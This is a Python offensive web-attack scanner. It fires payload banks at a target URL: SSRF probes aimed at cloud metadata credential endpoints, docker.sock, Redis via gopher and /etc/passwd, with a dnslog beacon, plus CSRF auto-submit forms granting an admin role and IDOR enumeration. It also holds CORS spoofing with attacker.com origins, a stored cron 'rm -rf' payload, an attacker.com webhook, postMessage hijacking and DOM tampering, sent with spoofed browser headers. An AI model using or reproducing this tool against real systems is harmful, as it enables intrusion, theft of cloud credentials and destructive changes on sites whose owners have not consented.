#!/usr/bin/env python3
# ╔═════════════════════════════════════════════════════════════════════════╗
# ║ Author : Haroon Ahmad Awan · CyberZeus  (haroon@cyberzeus.pk)           ║
# ║ License: MIT  ·  Offensive testing only                                 ║
# ╚═════════════════════════════════════════════════════════════════════════╝

import os, ssl, sys, time, random, string, logging, argparse, urllib.parse, json
import requests, bs4
from pathlib import Path
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright

# ────────────────────────────────────────────────────────────────────────────
# Config & Globals
# ────────────────────────────────────────────────────────────────────────────
ssl._create_default_https_context = ssl._create_unverified_context
warnings = __import__('warnings'); warnings.filterwarnings("ignore")
logging.basicConfig(level=logging.INFO, format="%(message)s")

DNSLOG_DOMAIN   = "9i8j94.dnslog.cn"
DEFAULT_THREADS = 14
MAX_PAGES       = 150
TIMEOUT         = 8

UA    = UserAgent()
LOG   = Path("_omega_report.md")
MS_TAGS = {
    "SSRF": ["Info Disclosure","Priv Esc"],
    "CSRF": ["Tampering","Repudiation"],
    "MARSF": ["Chain Exploit","Priv Injection"],
    "RARF": ["DNS Rebind","Alias SSRF"],
    "VREF": ["IDOR","Priv Esc"],
    "SREF": ["Stored Abuse"],
    "CLRF": ["CORS Bypass","Auth Leak"],
    "EPRF": ["Message Hijack"],
    "IMRF": ["DOM Tamper","UI Forgery"],
    "UDRF": ["SDK Abuse"]
}

# ────────────────────────────────────────────────────────────────────────────
# CLI
# ────────────────────────────────────────────────────────────────────────────
cli = argparse.ArgumentParser(description="  v5.0")
cli.add_argument("-u","--url",      required=True, help="Target base URL")
cli.add_argument("--threads",       type=int, default=DEFAULT_THREADS)
cli.add_argument("--max-pages",     type=int, default=MAX_PAGES)
cli.add_argument("--stealth",       action="store_true", default=True)
cli.add_argument("--debug",         action="store_true")
ARGS = cli.parse_args()
if ARGS.debug: logging.getLogger().setLevel(logging.DEBUG)

# ────────────────────────────────────────────────────────────────────────────
# Helpers
# ────────────────────────────────────────────────────────────────────────────
def smart_url(u):
    if u.startswith("http"): return u
    for p in ("https://","http://"):
        try:
            if requests.head(p+u,timeout=4).ok: return p+u
        except: pass
    return "http://"+u

def hdrs():
    return {"User-Agent":UA.random,
            "Referer":random.choice(["https://google.com","https://bing.com"]),
            "Accept":"*/*"}

def log(kind,url,payload,status,reason,conf):
    tags = ", ".join(MS_TAGS.get(kind,[]))
    e = (f"- **{kind}** `{url}`\n"
         f"  - Status : {status} (confidence {conf:.2f})\n"
         f"  - Reason : {reason}\n"
         f"  - Payload: `{payload}`\n"
         f"  - Tags   : {tags}\n")
    with open(LOG,"a",encoding="utf-8") as f: f.write(e+"\n")
    logging.info(e.strip().replace("\n  ","  "))

# ────────────────────────────────────────────────────────────────────────────
# Payload Banks
# ────────────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    # Basic
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.170.2/**/latest/meta-data/iam/security-credentials/",
    # Docker socket
    "http://unix:@/var/run/docker.sock/info",
    # Hex & semicolon variants
    "http://[0x7f000001]", "http://0;127.0.0.1",
    # FTP & Gopher
    "ftp://anonymous@localhost/", "gopher://127.0.0.1:6379/_INFO",
    # File
    "file:///etc/passwd",
    # DNS log
    f"http://{DNSLOG_DOMAIN}",
]

CSRF_TEMPLATES = [
    # Classic
    '<form method="POST" action="{t}"><input name="role" value="admin"></form><script>document.forms[0].submit()</script>',
    # GET via IMG
    '<img src="{t}?execute=1">',
    # fetch JSON
    '<script>fetch("{t}",{{method:"POST",credentials:"include"}})</script>',
    # UTF-7
    '<script>fetch("{t}",{{method:"POST",headers:{{"Content-Type":"+ADw-script+AD4-"}},body:"+ADw-role+AD4-admin+ADw-/role+AD4-"}})</script>',
    # no-cors
    '<script>fetch("{t}",{{method:"POST",mode:"no-cors",credentials:"include"}})</script>',
    # Meta-refresh
    '<meta http-equiv="refresh" content="2;url={t}?reset=true">',
    # Shadow DOM
    '<script>customElements.whenDefined("login-form").then(()=>{{let c=document.querySelector("login-form");c.shadowRoot.querySelector("[name=token]").value="att";c.shadowRoot.querySelector("form").submit();}});</script>',
]

MARSF_PAYLOADS = [
    {"role":"Admin","target_service":"privileged_backend"},
    {"chain":[{"service":"user"},{"service":"admin_backend"}]},
]

VREF_IDS = [f"{i:04d}-0000-0000-0000-0000000000AA" for i in range(1000,1010)]

RARF_DOMAINS = [
    f"http://internal.service.{DNSLOG_DOMAIN}",
    "http://[0x7f000001]",
    "ftp://anonymous@localhost/",
    "http://0;127.0.0.1"
]

CLRF_ORIGINS = [
    "null","http://evil.com","http://attacker.com","http://sub.evil.com"
]

SREF_PAYLOADS = [
    {"cmd":"restart","submit":"yes"},
    {"cron":"* * * * *","payload":"rm -rf /tmp/cache"},
    {"webhook_url":"https://attacker.com/callback?exec=1"}
]

EPRF_SCRIPTS = [
    '<iframe src="{u}" onload="this.contentWindow.postMessage(\'{{\"cmd\":\"transfer\",\"amt\":9999}}\',"*")"></iframe>',
    '<script>new BroadcastChannel("app").postMessage({cmd:"shutdown"});</script>'
]

IMRF_SCRIPTS = [
    '<script>setTimeout(()=>{let f=document.forms[0];let i=document.createElement("input");i.name="admin_override";i.value="1";i.type="hidden";f.appendChild(i);f.submit();},500);</script>',
    '<script>document.querySelector("login-form").shadowRoot.querySelector("input[name=pw]").value="pwned";document.querySelector("login-form").shadowRoot.querySelector("form").submit();</script>'
]

UDRF_PAYLOADS = [
    {"url":"file:///etc/passwd"},
    {"url":"s3://attacker.bucket/exploit.sh"},
    {"target":"unix:/var/run/docker.sock","cmd":"INFO"}
]

# ────────────────────────────────────────────────────────────────────────────
# Exploit Functions
# ────────────────────────────────────────────────────────────────────────────
def exploit_ssrf(u):
    for pl in SSRF_PAYLOADS:
        try:
            r = requests.get(u, params={"url":pl}, headers=hdrs(), timeout=TIMEOUT)
            adaptive = (time.sleep(random.uniform(0.5,1.5)))
            b = r.text.lower()
            if "root:x" in b:
                log("SSRF", u, pl, "Confirmed", "/etc/passwd leaked",0.95); return
            if DNSLOG_DOMAIN in pl:
                log("SSRF", u, pl, "Blind", "OOB beacon",0.65)
        except: continue

def exploit_csrf(u):
    for tpl in CSRF_TEMPLATES:
        html = tpl.format(t=u)
        try:
            with sync_playwright() as p:
                b = p.firefox.launch(headless=True)
                pg = b.new_context().new_page()
                pg.set_content(html); pg.wait_for_timeout(1500)
                if "error" not in pg.content().lower():
                    log("CSRF", u, tpl, "Suspected", "Auto-submit succeeded",0.60); b.close(); return
                b.close()
        except: continue

def exploit_marsf(u):
    for pl in MARSF_PAYLOADS:
        try:
            r = requests.post(u+"/api/user/4711/roles", json=pl, headers=hdrs(), timeout=TIMEOUT)
            if r.status_code==200 and "admin" in r.text.lower():
                log("MARSF", u, json.dumps(pl), "Confirmed", "Chain exploit",0.90); return
        except: continue

def exploit_vref(u):
    for vid in VREF_IDS:
        try:
            r = requests.get(f"{u}/user/{vid}", headers=hdrs(), timeout=TIMEOUT)
            if r.status_code==200 and "admin" in r.text.lower():
                log("VREF", f"{u}/user/{vid}", vid, "Confirmed","ID tamper",0.85); return
        except: continue

def exploit_rarf(u):
    for d in RARF_DOMAINS:
        try:
            r = requests.get(d, timeout=TIMEOUT)
            if r.status_code==200:
                log("RARF", u, d, "Confirmed","Alias SSRF",0.75); return
        except: continue

def exploit_clrf(u):
    for o in CLRF_ORIGINS:
        try:
            r = requests.options(u, headers={"Origin":o}, timeout=TIMEOUT)
            if "access-control-allow-origin" in r.headers and o in r.headers["access-control-allow-origin"]:
                log("CLRF", u, f"Origin: {o}","Confirmed","CORS bypass",0.80); return
        except: continue

def exploit_sref(u):
    for pl in SREF_PAYLOADS:
        try:
            requests.post(u+"/iot/config", data=pl, timeout=TIMEOUT)
            time.sleep(1)
            r2 = requests.get(u+"/iot/status", timeout=TIMEOUT)
            if any(k in r2.text.lower() for k in ["restarting","updated"]):
                log("SREF", u, json.dumps(pl),"Confirmed","Stored job executed",0.78); return
        except: continue

def exploit_eprf(u):
    for scr in EPRF_SCRIPTS:
        html = scr.format(u=u)
        try:
            with sync_playwright() as p:
                b = p.chromium.launch(headless=True)
                pg = b.new_context().new_page()
                pg.set_content(html); pg.wait_for_timeout(1500)
                if "success" in pg.content().lower():
                    log("EPRF", u, scr,"Confirmed","Message hijack",0.88); b.close(); return
                b.close()
        except: continue

def exploit_imrf(u):
    for scr in IMRF_SCRIPTS:
        html = f'<form action="{u}" method="POST"><input name="user" value="admin"></form>{scr}'
        try:
            with sync_playwright() as p:
                b = p.firefox.launch(headless=True)
                pg = b.new_context().new_page()
                pg.set_content(html); pg.wait_for_timeout(1500)
                if "dashboard" in pg.content().lower():
                    log("IMRF", u, scr,"Confirmed","DOM tampered",0.95); b.close(); return
                b.close()
        except: continue

def exploit_udrf(u):
    for pl in UDRF_PAYLOADS:
        try:
            r = requests.post(u+"/sdk/relay", json=pl, timeout=TIMEOUT)
            if r.status_code==200 and ("root:x" in r.text.lower() or "exploit.sh" in r.text.lower()):
                log("UDRF", u, json.dumps(pl),"Confirmed","SDK relay abuse",0.92); return
        except: continue

# ────────────────────────────────────────────────────────────────────────────
# Main
# ────────────────────────────────────────────────────────────────────────────
def main():
    root = smart_url(ARGS.url.rstrip("/"))
    if not LOG.exists(): LOG.write_text("#   Findings\n\n",encoding="utf-8")
    logging.info(f"🔥   v5.0 scanning {root}")
    funcs = [exploit_ssrf, exploit_csrf, exploit_marsf, exploit_vref,
             exploit_rarf, exploit_clrf, exploit_sref, exploit_eprf,
             exploit_imrf, exploit_udrf]
    with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
        for fn in funcs:
            pool.submit(fn, root)

if __name__ == "__main__":
    main()
